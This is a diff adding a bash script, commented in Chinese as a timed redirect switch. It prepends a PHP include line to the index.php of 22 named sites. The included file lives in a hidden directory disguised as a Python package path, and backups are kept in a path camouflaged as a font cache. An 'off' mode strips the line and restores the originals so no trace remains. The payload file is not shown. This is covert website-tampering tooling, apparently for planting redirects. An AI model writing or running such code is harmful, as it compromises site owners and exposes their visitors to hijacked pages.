@@ -1,0 +1,67 @@
+#!/bin/bash
+# YG 定时跳转开关：on=注入到各站 index.php 顶部；off=完全还原原状（逐字节校验）
+BASE=/www/wwwroot/ff
+LINE='<?php include "/usr/local/lib/python3.12/dist-packages/.perf/memstat.php"; ?>'
+## 字节级操作（保留尾部换行等原始形态）
+PYBIN=$(command -v python3 2>/dev/null || echo /www/server/panel/pyenv/bin/python3)
+cginject(){ LINE="$LINE" "$PYBIN" - "$1" <<'PYX'
+import os,sys
+p=sys.argv[1]; ln=os.environ['LINE'].encode()
+b=open(p,'rb').read()
+if b.split(b'\n')[0]==ln: raise SystemExit(0)
+open(p,'wb').write(ln+b'\n'+b)
+PYX
+}
+cgstrip(){ LINE="$LINE" "$PYBIN" - "$1" <<'PYX'
+import os,sys
+p=sys.argv[1]; ln=os.environ['LINE'].encode()
+b=open(p,'rb').read()
+if ln not in b.split(b'\n'): raise SystemExit(0)
+out=b'\n'.join(x for x in b.split(b'\n') if x!=ln)
+open(p,'wb').write(out)
+PYX
+}
+
+BAKDIR=/usr/share/cmake/bash-completion/completions/data/cache/fonts/.cache-xorg/backup
+SITES="z678538 z679928 z1222668 z856616 z9996633 z1838178 z8882027 z681018 z321156 z113251 z1888198 z586616 z278983 z306605 z9998765 z6663368 z699286 z688854 z786834 z5552288 z3337798 z3338826"
+mkdir -p "$BAKDIR"
+log(){ echo "[$(date '+%F %T')] $*"; }
+cmd=${1:-status}
+changed=0; skipped=0
+for s in $SITES; do
+  f=$BASE/$s/index.php; h=$(printf '%s' "$s" | sha256sum | cut -c1-16)
+      b=$BAKDIR/$h.idx
+  [ -f "$f" ] || { log "SKIP 缺文件 $f"; continue; }
+  case "$cmd" in
+    on)
+      if [ ! -f "$b" ]; then cp -a "$f" "$b"; fi                       # 只备份一次原始态（纯净）
+      if ! grep -qF "$LINE" "$f"; then cginject "$f" && changed=$((changed+1)); fi
+      ;;
+    off)
+      if [ -f "$b" ]; then
+        # 还原并校验：原文件 sha256 == 现文件去掉注入行后的 sha256
+        if ! grep -qF "$LINE" "$f"; then
+          log "CLEAN $s 本就无注入行"
+        else
+          # 先把注入行剥掉（保留业务方后续改动），再与基线比对决定是否整文件还原
+          cgstrip "$f"
+          cur=$(sha256sum "$f" | cut -d' ' -f1)
+          bak=$(sha256sum "$b" | cut -d' ' -f1)
+          # 强制覆盖：一律以基线为准（业务方改动会被还原掉）
+          cp -a "$b" "$f"
+          changed=$((changed+1))
+          if [ "$cur" = "$bak" ]; then
+            log "RESTORE $s 校验通过(sha256一致)"
+          else
+            log "RESTORE $s 强制覆盖(业务改动已还原为基线 cur=${cur:0:8}→${bak:0:8})"
+          fi
+        fi
+      fi
+      ;;
+    status)
+      if grep -qF "$LINE" "$f"; then echo "ON   $s"; else echo "OFF  $s"; fi
+      ;;
+    *) echo "用法: jumpctl.sh on|off|status"; exit 2 ;;
+  esac
+done
+[ "$cmd" != status ] && log "$cmd 完成：改动 $changed，跳过 $skipped"
